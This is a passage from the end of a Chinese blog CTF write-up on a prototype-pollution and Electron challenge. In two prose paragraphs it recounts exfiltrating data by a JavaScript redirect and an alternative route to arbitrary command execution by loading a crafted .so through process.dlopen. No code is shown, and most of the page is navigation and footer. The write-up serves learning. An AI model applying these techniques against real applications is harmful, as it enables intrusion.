+<p>一开始想了半天fs怎么外带，印象里fs支持url path，然后URL编码绕过之类的trick，但是翻了半天感觉只支持file协议没法外带，最后是whj提醒我这里是js直接跳转外带就可以了。。。只能说已经傻了，局限住了</p>
+<h3 id="奇怪的解"><a href="#奇怪的解" class="headerlink" title="奇怪的解"></a>奇怪的解</h3><p>whj后来发现在拿到fs对象后，调用cp方法能拿到process对象，但是这个process对象已经是被阉割的对象了，没有mainModule（具体原因不明），也就不能一键打通了，但是他找到一个dlopen方法，类似于udf可以加载一个node的动态链接库，然后用fs的写文件写一个按格式编译出来的.so加载起来完成任意命令执行，只能说很顶级</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag"># 原型链污染</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/hxpCTF2022wp.html" rel="prev" title="hxpCTF2022wp">
+      <i class="fa fa-chevron-left"></i> hxpCTF2022wp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pollution-here-pollution-there-pollution-everywhere"><span class="nav-number">1.</span> <span class="nav-text">pollution here, pollution there, pollution everywhere</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wp"><span class="nav-number">1.1.</span> <span class="nav-text">wp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number">1.1.1.</span> <span class="nav-text">cookie原型链污染</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93RCE"><span class="nav-number">1.1.2.</span> <span class="nav-text">ejs原型链污染RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSP%E6%8E%A7%E5%88%B6"><span class="nav-number">1.1.3.</span> <span class="nav-text">CSP控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">1.1.4.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#electron%E9%83%A8%E5%88%86"><span class="nav-number">1.1.5.</span> <span class="nav-text">electron部分</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#electron%E5%AE%89%E5%85%A8%E5%8F%82%E6%95%B0"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">electron安全参数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95electron"><span class="nav-number">1.1.6.</span> <span class="nav-text">调试electron</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.1.7.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E8%A7%A3"><span class="nav-number">1.1.8.</span> <span class="nav-text">奇怪的解</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">175</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">92</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
